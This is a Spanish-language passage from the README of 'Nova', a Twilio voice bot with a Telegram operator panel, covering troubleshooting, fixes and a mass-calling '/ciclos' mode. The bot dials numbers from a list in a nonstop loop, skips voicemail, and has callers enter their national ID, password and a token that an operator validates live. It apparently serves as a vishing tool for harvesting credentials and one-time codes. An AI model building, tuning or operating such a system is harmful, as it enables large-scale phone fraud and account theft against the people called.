> segundos en sonar (Twilio analiza antes de entregar el `<Say>`).

> ⚠️ Si tu cuenta rechazara la detección de buzón (Twilio responde *"Invalid or
> disallowed parameters"*), Nova lo detecta, **reintenta sin ese parámetro** y la
> llamada sale igual. Además, si el primer dato no se marca tras varios intentos,
> Nova asume que es un buzón (o que nadie contesta) y cuelga.

**El usuario cuelga a mitad de la llamada** — Twilio avisa por el `status_callback`
y la llamada **muere ahí**: se limpia el estado y el panel de Telegram queda cerrado
(`🔴 colgado`). No se queda esperando validación.

**Colgar desde Telegram (`🛑 Colgar`)** — el botón está **siempre** en el panel. Al
pulsarlo Nova pide a la API de Twilio que termine la llamada (`calls(sid).update
(status="completed")`), así que la voz se corta de inmediato, no solo se marca el
estado en Telegram. Además, cuando el usuario **contesta**, el panel muestra la hora
(`✅ Contestó: ...`).

**El panel de Telegram tarda en salir (solo aparece al contestar)** — Nova abre el
panel **solo cuando alguien contesta** la llamada; mientras suena no hay nada en el
grupo. Si la llamada se contesta y aun así no ves el panel, revisa que el
`status_callback` de Twilio incluya `answered`
(`status_callback_event=["initiated", "ringing", "answered", "completed"]`). Si el
panel nunca sale, el `status_callback` no está llegando: comprueba que la URL pública
(`WEBHOOK_BASE_URL`/ngrok) sea alcanzable desde Twilio.

**El panel tarda en mostrar el número que la persona acaba de marcar** — medido: cada
`editMessageText` de este grupo tarda **~0,6 s** y Telegram **encola** las ediciones
(10 ediciones seguidas = **12,4 s**). Al recibir un número el flujo pedía varios
refrescos casi a la vez (el del número y, justo después, el de la fase con sus
botones), y **todos** se aplicaban en fila: el panel con la cédula recién marcada
tardaba segundos en verse. Desde el arreglo, mientras una edición está en vuelo los
refrescos que ya fueron **pisados** por otro más nuevo **se saltan**: solo se pinta el
**ÚLTIMO estado pedido**, así que el panel sale ya con el número marcado (ver
`_tg_editar_panel` y `prueba_panel_sin_cola.py`). Ojo: el servidor NO es el cuello de
botella (responde en **1–18 ms** y la BD tarda **~1,4 ms** por escritura).

**Después de marcar `#` tarda en oírse la pregunta siguiente** — no era la captura: con
`finishOnKey="#"` el `<Gather>` termina **al instante** (la API de eventos de Twilio
registra `msg='Gather End'` + `finished_on_key='#'` en el **mismo segundo**). Lo que
tardaba era el **silencio** que el TwiML de la pregunta siguiente ponía **antes** de
hablar: la cédula y la clave usaban `PAUSA=2`, así que sonaban **2 s de silencio** tras
la tecla numeral. Ahora esas dos preguntas enlazan **de corrido** (`PAUSA_INICIO=0.5`);
el token (`PAUSA=2`) mantiene su pausa. Si aun así lo quieres más lento, sube
`PAUSA_INICIO` (p. ej. a `1`).

**El saludo "Soy Nova" tarda unos segundos en sonar** — la culpa era de la
**detección de buzón (AMD) SÍNCRONA**: con la AMD en modo bloqueante, Twilio retenía
el TwiML (el `<Say>` del saludo) hasta terminar de analizar la llamada, así que quien
contestaba oía varios segundos de silencio. Ahora la AMD va **asíncrona**
(`MAQUINA_DETECCION_ASINCRONA=1`, por defecto): Twilio entrega el saludo **de
inmediato** (típicamente **<1 s**) y manda el resultado del análisis aparte a
`/voice/amd`. Ajusta `MAQUINA_DETECCION_TIMEOUT` (en **SEGUNDOS**; 3 por defecto, el
de Twilio es 30) solo para subir/bajar cuánto insiste el análisis; ya **no** retrasa el
saludo. Si pones `MAQUINA_DETECCION_ASINCRONA=0` vuelves al modo síncrono (más lento).
La otra demora natural es la **síntesis de voz** del saludo por parte de Twilio (el
texto de `SALUDO` en `config.py`); acortarlo también ayuda. Todo lo demás (panel de
Telegram y base de datos) ya va en hilos aparte, así que NO demora la voz.

**Varias llamadas a la vez (10 o más)** — cada llamada vive aislada por su
`CallSid` (panel, números y estado propios); verifícalo con
`prueba_cinco_simultaneas.py`, `prueba_llamadas_independientes.py` y
`prueba_reloj_sin_429.py` (10 llamadas a la vez: cada una con su panel y con el
total de mensajes acotado por el **presupuesto** `TELEGRAM_MSGS_POR_MINUTO`,
18/min por defecto). Como el panel ya **no se refresca periódicamente**, ninguna
edición compite con el límite de Telegram (~20/min por grupo). Si aun así ves
avisos `[telegram] límite alcanzado`, baja `TELEGRAM_MSGS_POR_MINUTO` (p. ej. a
`15`).

**El cronómetro de una llamada vieja se queda congelado / la llamada se queda "en
llamada" para siempre** — pasaba si el aviso de fin de Twilio (`completed`) se
perdía (red, ngrok) o si se agotaban los intentos de marcar: la ficha quedaba viva
y el panel se congelaba. Ya **no ocurre**: hay un **vigilante**
(`TIEMPO_SIN_ACTIVIDAD` / `INTERVALO_VIGILANCIA`) que cierra las llamadas que llevan
rato **sin dar señales de vida**, un **tope duro** en Twilio (`LIMITE_LLAMADA`) y el
panel se cierra siempre al agotar los intentos. Si ves un panel parado, súbelo o
bájalo en el `.env` según cuánto quieras esperar antes de considerarla abandonada.

**El ⏱️ cronómetro marcaba muy poco (p. ej. 00:02 en una llamada de 2 min)** —
pasaba porque recibir el 2.º número (y cada intento del token) **reiniciaba**
`inicio`, que era a la vez la base del cronómetro y el arranque del tope de
validación. Ya **no ocurre**: `inicio` queda **fijo** en el momento en que
alguien **contesta** (base del cronómetro) y la espera de cada fase se marca
aparte en `inicio_espera`. Así una llamada de 2 minutos muestra `02:00` y el tope
`TIMEOUT_APROBACION` cuenta desde el **último dato recibido**, no desde que
arrancó la llamada. Verifícalo con `prueba_flujo_primero_segundo.py`.

**El panel dice `✅ Contestó` pero la `⏱️ Duración` se queda clavada en `00:00`**
— antes podía pasar si Twilio mandaba un aviso de estado **tardío o repetido**
(`in-progress`) DESPUÉS de que la llamada ya se había cerrado: ese aviso volvía a
crear la ficha y salía un **panel fantasma** con `✅ Contestó` y la duración en
`00:00`, como si la llamada siguiera viva sin avanzar. Ya **no ocurre**: Nova
recuerda los `CallSid` **resueltos** (`resueltas`) y **ignora** cualquier aviso de
voz de una llamada ya cerrada (no la resucita). El cronómetro, además, **se
recalcula** con el reloj real en cada refresco, así que una llamada viva siempre
avanza. Verifícalo con `prueba_flujo_primero_segundo.py`.

**Nova "tarda muchísimo" en leer lo que se marca en el teléfono** — pasaba porque
Twilio **no envía los dígitos** hasta que hay un **silencio tras la última tecla**
(el `timeout` del `<Gather>`), y estaba en **15 s** (`TIMEOUT_ENTRADA`). Ya **no
ocurre**: la cédula y la clave usan el silencio **corto**
(`TIMEOUT_DIGITOS_CORTO`, 4 s) y el token el completo (`TIMEOUT_ENTRADA`, 8 s); si
se marca **`#`** la lectura es **inmediata** (no se espera silencio alguno). El
conteo **se reinicia con cada tecla**, así que marcar despacio no
corta el número. Si algún usuario marca el número con pausas largas, sube
`TIMEOUT_DIGITOS_CORTO` en el `.env`. Verifícalo con `prueba_flujo_primero_segundo.py`
y `prueba_flujo_tercero.py`.

**Gasto accidental** — cada llamada consume saldo de Twilio. `/apagar` detiene la
cadena (deja de marcar llamadas nuevas) pero **no** corta las que ya están en curso.

**Cadena de llamadas (`/ciclos`)** — `/ciclos` mantiene siempre varias llamadas a la
vez (`CICLOS_GRUPO`, 5 por defecto; puedes pedir otro grupo con `/ciclos 8`) y, en
cuanto una cuelga, marca la **siguiente** de la lista: nunca deja de llamar. Recorre
**todos** los números de `numeros.txt` y, con `CICLOS_REPETIR=1` (por defecto), vuelve
a empezar al llegar al final. `/apagar` la detiene. Ajustes en el `.env`:
`CICLOS_GRUPO`, `CICLOS_PAUSA` (segundos entre marcas) y `CICLOS_REPETIR`.

Mientras la cadena está **en marcha**, Nova mantiene **un mensaje EN VIVO** en el
grupo que se va **actualizando** (sobre el **mismo** mensaje, editándolo: no se llena
el chat) con **por qué número de la lista va** (`Va por el número N/T`), cuántas
lleva (`Ha llamado a N`), cuántas siguen en curso y cuánto tiempo lleva andando.
Cada cuántos segundos se refresca lo fija `CICLOS_PROGRESO_INTERVALO` (8 s por
defecto; se respeta el presupuesto de Telegram para no provocar un 429). `/estado`
y `GET /salud` también informan del avance (`cadena_posicion`, `cadena_total`).

La cadena **nunca se queda sin marcar**: una llamada que no llega a contestarse
(suena y no la cogen, sale ocupada, la corta Twilio…) también **libera su hueco**
(vía el aviso `completed` de Twilio). Y si Twilio **pierde** ese aviso, el hueco se
libera solo pasado `TIEMPO_SIN_ACTIVIDAD` (solo cuando no hay ninguna llamada viva
de ese número), así los "huecos fantasma" no se acumulan ni clavan la cadena.
Verifícalo con `prueba_ciclos.py`.

## 9. Diferencias respecto al código original

Tres correcciones fueron necesarias para que el proyecto funcionara de verdad:

1. **URL de la API de Telegram.** El original apuntaba a
   `https://telegram.org<TOKEN>/sendMessage`, que no es un endpoint válido, así que
   ningún menú llegaba al grupo. Ahora usa `https://api.telegram.org/bot<TOKEN>/...`.
2. **URL del túnel.** El original traía `https://ngrok-free.app` fijo, que no es una
   URL real. Ahora se lee el túnel activo de ngrok (o `WEBHOOK_BASE_URL` del `.env`).
3. **Espera sin bloqueo.** El original introducía `time.sleep(1)` dentro del handler
   de Flask, equivalente a una conexión HTTP abierta por 90 segundos. Ahora la llamada
   se queda en silencio con `<Pause>` y vuelve a consultar el estado cada 5 segundos,
   lo que además permite que el servidor atienda el webhook de Telegram durante la
   espera.

Además se añadió: reintento cuando el usuario no marca nada, `answerCallbackQuery`
para quitar el spinner de los botones, edición del mensaje al decidir (evita clics
dobles), límite de reintentos, limpieza de llamadas finalizadas, historial en base
de datos y registro de qué operador aprobó cada llamada.
